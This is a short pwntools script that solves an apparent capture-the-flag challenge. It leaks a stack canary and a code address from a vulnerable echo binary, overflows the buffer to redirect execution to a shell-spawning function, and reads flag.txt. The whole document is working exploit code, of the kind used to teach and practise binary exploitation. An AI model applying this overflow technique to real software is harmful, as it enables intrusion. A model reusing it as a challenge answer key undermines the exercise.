#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF("./leak", checksec=False)
context.log_level = "error"


def start(argv=[], *a, **kw):
    gdbscript = """
    break *main + 98
    continue
    print
    """.format(
        **locals()
    )

    if args.GDB:
        context.log_level = "debug"
        context.terminal = ["tmux", "split", "-h"]
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=True, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def main():
    io = start()								# Start the io
    io.recvuntil(b"Welcome to the echo service!\n")				# wait until read() is reached
    io.send(b'A'*24)							# overflow up to the address of _start()
    start_address =io.recvline()[24:-1]					# extract the address of _start()
    start_address = int(start_address.hex(),16)				# convert the extracted bytes
    start_address = p64(start_address+0x100000000, endian ='big')		# add 0x100, offset of givemeshellpls() from
    									# _start becomes add 0x100000000 due to biig 
    									# endian
    start_address = start_address[2:]+start_address[0:2]			# format address
    io.send(b'A'*41)							# overflow up to canary/cookie
    cookie = io.recvline()							# extract canary. Note: The null byte is not 
    									# here
    cookie =cookie[41:48]							# remove junk
    payload = b'A'*40 + b'\x00' + cookie + b'B'*8 + start_address		# form the final overflow. Note: \0 added
    io.sendline(payload)							# pwn
    var = io.recvline()							
    var = io.sendline()							# Send \n to reach the return statement
    io.recvuntil(b'')							# Wait for the empty bash line
    io.sendline(b'cat flag.txt')						# leak the flag
    flag = io.recvline()							# junk
    flag = io.recvline()							# junk
    flag = io.recvline()							# yeeeeeiii
    print(str(flag)[2:-3])
    
if __name__ == "__main__":
    main()

